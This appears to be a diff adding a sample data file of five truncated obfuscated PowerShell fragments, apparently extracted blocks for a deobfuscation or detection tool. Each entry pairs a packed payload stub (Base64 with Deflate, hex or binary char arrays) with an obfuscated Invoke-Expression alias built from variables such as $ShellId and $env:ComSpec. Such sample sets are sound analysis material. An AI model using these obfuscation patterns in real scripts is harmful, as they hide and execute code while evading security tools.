@@ -1,0 +1,20 @@
+file1:
+block[0] b"( new-ObjECT  SYstEm.IO.cOmprEsSIon.dEfLatesTReaM( [sYsTeM.Io.MemOrysTrEAm][cONVERt]::FrOMbAsE64striNG( '7Vt7c9u4Ef8/M/kOiEYtyNOjkl+9s+tObEfOuePaquWLO"
+block[1] b'iNVOKE-ExpRessioN'
+
+file2:
+block[0] b"(NeW-OBjeCT  io.CoMpREsSiON.deFLateStrEam([sYSTEM.iO.mEMOrYsTream] [systEm.CoNvErt]::fRomBAsE64sTRiNG( '7X1pd9vGkujnyTn5Dxwdz1h6lji9AWjknMwZUJZtzbWcyJ"
+block[1] b"( $shelLid[1]+$sheLlid[13]+'x')"
+
+file3:
+block[0] b"(nEw-obJeCT iO.cOmpResSIOn.deFlAtestReAM( [sysTEm.IO.MEmoryStREAM][COnVERT]::FRoMbasE64StriNg( '7T1rc+M2kt9Tlf+A0bmOUlbUPHJXl/LGu/HYcuKNX2t5xrPlcaVoCb"
+block[1] b"( $eNv:COMSpeC[4,15,25]-joiN'')"
+
+file4:
+block[0] b"( (49, '6e',56, '6f' , '6b',45,'2d', 65, 58 , 70, 72, 65,53 ,53 ,69 , '4f','6e', 20,28, '6e',65,77 ,'2d' ,'6f' , 42 , '6a' , 45 ,63, 74 , 20, 20,49 ,'"
+block[1] b"( $PshoMe[21]+$pSHOme[30]+'x')"
+
+file5:
+block[0] b"-JOin( '100110C100000k101000f100000f100100L1110011b1001000y1000101L1101100i1001100y1001001}1000100C1011011b110001k1011101b101011L100100f1110011}100100"
+block[1] b"( ([stRInG]$VErBosePrEFEreNcE)[1,3]+'x'-jOin'')"
+
